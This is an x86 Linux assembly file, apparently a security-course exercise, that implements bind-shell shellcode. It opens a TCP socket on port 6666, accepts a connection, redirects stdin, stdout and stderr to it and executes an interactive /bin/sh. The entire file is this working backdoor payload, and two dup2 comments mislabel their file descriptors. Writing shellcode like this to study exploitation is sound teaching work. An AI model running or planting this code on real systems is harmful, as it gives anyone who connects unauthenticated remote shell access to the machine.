#Sacha ATHIAS SRS2023
.section 	.text

.global 	_start

_start:

#	socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
push	$0
push	$6
push	$1
push	$2
push	%esp
push	$1			
call	socketcall

#	save socket
mov 	%eax,		%esi

#	bind(soc, &serv_addr, sizeof(serv_addr))
push	$0
push	$0
push	$0
push	$0x0a1a0002
mov	%esp,	%edx
push 	$0
push	$16
push	%edx
push	%esi
push	%esp
push 	$2				# push arg 1 socketcall function 
call	socketcall			#call routine

#	listen(soc, 1);
push	$0
push	$1
push	%esi
push	%esp
push	$4				# push arg 1 sockercall function
call	socketcall			# call routine

#	soc = accept(soc, NULL, NULL);	
push	$0
push	$0
push	$0
push	%esi
push	%esp
push	$5				# push arg 1 sockercall function
call	socketcall			# call routine

mov 	%eax,		%esi

push	$63
pop	%eax
mov	%esi,		%ebx
xor	%ecx,		%ecx
int	$0x80			

push	$63 		# dup2(soc, 0)
pop	%eax
mov	%esi,		%ebx
push	$1
pop	%ecx
int	$0x80			

push	$63		# dup2(soc, 0)
pop	%eax
mov	%esi,		%ebx
push	$2
pop	%ecx
int	$0x80			

push	$11
pop	%eax
xor	%ebx,	%ebx
push	%ebx
push	$0x68732f6e
push	$0x69622f2f
mov	%esp,	%ebx
mov	$0x00692d,%edx
push	%edx
mov	%esp,	%edx
xor	%ecx,	%ecx
push	%ecx
push	%edx
push	%ebx
mov	%esp,	%ecx
xor	%edx,		%edx
int	$0x80

push	$1
pop	%eax
push	$42
pop	%ebx
int	$0x80

socketcall:
push	%ebp
mov	%esp, 		%ebp
mov 	$0x66, 		%eax
mov 	8(%ebp),	%ebx
mov 	12(%ebp),	%ecx
int 	$0x80
leave
ret

